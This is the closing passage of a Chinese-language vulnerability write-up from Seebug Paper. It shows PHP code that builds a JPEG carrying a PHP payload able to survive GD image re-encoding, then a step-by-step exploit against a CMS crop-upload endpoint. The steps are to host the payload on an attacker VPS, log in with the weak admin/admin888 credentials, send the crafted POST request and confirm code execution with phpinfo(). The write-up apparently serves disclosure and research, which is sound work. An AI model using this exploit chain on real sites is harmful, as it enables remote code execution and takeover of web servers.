                    <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="k">if</span><span class="p">(</span><span class="nx">checkImage</span><span class="p">(</span><span class="s1">&#39;payload_&#39;</span><span class="o">.</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$outStream</span><span class="p">))</span> <span class="p">{</span>
                    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Success!&#39;</span><span class="p">);</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nb">unlink</span><span class="p">(</span><span class="s1">&#39;payload_&#39;</span><span class="o">.</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Something\&#39;s wrong&#39;</span><span class="p">);</span>

    <span class="k">function</span> <span class="nf">checkImage</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$unlink</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">global</span> <span class="nv">$correctImage</span><span class="p">;</span>
        <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
        <span class="nv">$correctImage</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
        <span class="nb">imagecreatefromjpeg</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$unlink</span><span class="p">)</span>
            <span class="nb">unlink</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
        <span class="k">return</span> <span class="nv">$correctImage</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="nf">custom_error_handler</span><span class="p">(</span><span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="nv">$errfile</span><span class="p">,</span> <span class="nv">$errline</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">global</span> <span class="nv">$extraBytes</span><span class="p">,</span> <span class="nv">$correctImage</span><span class="p">;</span>
        <span class="nv">$correctImage</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/(\d+) extraneous bytes before marker/&#39;</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="nv">$m</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$m</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
                <span class="nv">$extraBytes</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$m</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">class</span> <span class="nc">DataInputStream</span> <span class="p">{</span>
        <span class="k">private</span> <span class="nv">$binData</span><span class="p">;</span>
        <span class="k">private</span> <span class="nv">$order</span><span class="p">;</span>
        <span class="k">private</span> <span class="nv">$size</span><span class="p">;</span>

        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$order</span> <span class="o">=</span> <span class="k">false</span><span class="p">,</span> <span class="nv">$fromString</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">order</span> <span class="o">=</span> <span class="nv">$order</span><span class="p">;</span>
            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$fromString</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span>
                    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;File not exists [&#39;</span><span class="o">.</span><span class="nv">$filename</span><span class="o">.</span><span class="s1">&#39;]&#39;</span><span class="p">);</span>
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="nv">$filename</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">size</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">public</span> <span class="k">function</span> <span class="nf">seek</span><span class="p">()</span> <span class="p">{</span>
            <span class="k">return</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">size</span> <span class="o">-</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">));</span>
        <span class="p">}</span>

        <span class="k">public</span> <span class="k">function</span> <span class="nf">skip</span><span class="p">(</span><span class="nv">$skip</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">,</span> <span class="nv">$skip</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">public</span> <span class="k">function</span> <span class="nf">readByte</span><span class="p">()</span> <span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">eof</span><span class="p">())</span> <span class="p">{</span>
                <span class="k">die</span><span class="p">(</span><span class="s1">&#39;End Of File&#39;</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="nv">$byte</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
            <span class="k">return</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$byte</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">public</span> <span class="k">function</span> <span class="nf">readShort</span><span class="p">()</span> <span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">die</span><span class="p">(</span><span class="s1">&#39;End Of File&#39;</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="nv">$short</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">order</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$short</span> <span class="o">=</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$short</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$short</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nv">$short</span> <span class="o">=</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$short</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$short</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="nv">$short</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">public</span> <span class="k">function</span> <span class="nf">eof</span><span class="p">()</span> <span class="p">{</span>
            <span class="k">return</span> <span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="o">||</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span>
</pre></div>


<p>使用脚本进行处理，新生成的文件就能过GD</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/09/4f08665f-6b22-4a76-b65e-a280ef6669ff.png-w331s" /></p>
<p>过GD的新文件  payload_faith.php</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/09/e7d0030a-9429-4762-bd97-808c312c30ed.jpg-w331s" /></p>
<p>然后将新文件放到自己的 php-web 环境的 vps 上,一定要是 phpweb 环境（并开启短标签），phpweb 环境（并开启短标签，php 默认开启）（因为 payload 是 php 语句），其他环境也可，但需要自行构造 payload 所需的图片 <code>http://your_vps/payload_faith.php</code></p>
<h6>③ 将各个参数补齐，发送最后的Payload</h6>
<p>查看原图的长宽高</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/09/99d72738-052e-4307-8e79-28501d411c6f.png-w331s" /></p>
<p>w=x2=图片宽度
h=y2=图片高度
x1=y1=固定0
根据你自己的图片做调整</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/09/2ad4f2c3-cfb4-48d2-90c6-d5739df93f4b.png-w331s" /></p>
<h6>④ phpinfo()代码执行验证，访问最后的文件，在网站跟目录</h6>
<p><img alt="" src="https://images.seebug.org/content/images/2017/09/fde4c269-afff-4992-87b2-9ea7cde9267c.png-w331s" /></p>
<h4>网络验证</h4>
<p>后台地址：<a href="http://xxxxxx/Admin/Index/login.html">http://xxxxxx/Admin/Index/login.html</a>
账号密码：admin       admin888  弱口令</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/09/8a455f71-5596-4f20-9a48-868172e4f662.jpg-w331s" /></p>
<p>① 直接使用生成好的过GD文件payload_faith.php，并放到自己的vps上面</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/09/f903924a-8193-4ada-810a-00c71dac200a.jpg-w331s" /></p>
<p>② 发送payload</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/09/56fa161a-8d85-4d0d-ab96-5451b58ff263.jpg-w331s" /></p>
<div class="codehilite"><pre><span></span><span class="nf">POST</span> <span class="nn">/Plug/Input/cropzoomUpload.html</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">104.224.134.110</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=f8gk8cjfvj1e2to5gplnh5ifi7</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">192</span>

viewPortW=500&amp;viewPortH=334&amp;imageX=0&amp;imageY=0&amp;imageRotate=0&amp;imageW=500&amp;imageH=334&amp;imageSource=http://x.x.x.x/payload_faith.php?1.jpg&amp;selectorX=0&amp;selectorY=0&amp;selectorW=500&amp;selectorH=334
</pre></div>


<p>③ 通过执行phpinfo()进行验证漏洞
<img alt="" src="https://images.seebug.org/content/images/2017/09/492e6cd5-edba-415c-a9e9-12be537ed26a.jpg-w331s" /></p>
      
<hr>
<p><img src="https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg" alt="Paper" style="width: 220px">
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href="https://paper.seebug.org/387/">https://paper.seebug.org/387/</a></p>
            
    </section>

  <nav class="pagination" role="navigation" style="padding: 3rem;">
    
      <a class="newer-posts" href="/386/"><span aria-hidden="true">&larr;</span> 从WordPress SQLi谈PHP格式化字符串问题</a>
    
    
      <a class="older-posts" href="/388/">蜻蜓二代“Dragonfly2.0”恶意组件分析报告（上篇） <span aria-hidden="true">&rarr;</span></a>
    
  </nav>


    

      
        <footer class="post-footer">
          <figure class="author-image">
            <a class="img" href="/users/author/?nickname=FaIth4444"
               style="background-image: url(https://images.seebug.org/uploads/2017/08/avatar.png)"><span
                class="hidden">'s Picture</span></a>
          </figure>

          <section class="author">
            <h4><a
                href="/users/author/?nickname=FaIth4444">FaIth4444</a>
            </h4>
            <p>阅读更多有关<a
                href="/users/author/?nickname=FaIth4444">该作者</a>的文章
            </p>
            
            <div class="author-meta">
            </div>
          </section>

          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          

        </footer>
      
    
    <br>
    <section class="plugin_comment">
    </section>

  </article>
  <section class="plugin_feedback"></section>


  </div>
</main>
</div>

<script type="text/javascript" src="/static/js/jquery.min.js"></script>
<script type="text/javascript" src="/static/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/static/js/index.js"></script>
<script type="text/javascript" src="/static/js/prism-loader.js"></script>
<script type="text/javascript" src="/static/js/prism.js"></script>
<script type="text/javascript" src="/static/js/jquery.ghostHunter.js"></script>
<script type="text/javascript" src="/static/js/js.cookie.js"></script>
<script type="text/javascript" src="/static/js/custom.js?t=20170821"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/comment_main.js"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/plugin_feedback.js"></script>
</body>

</html>
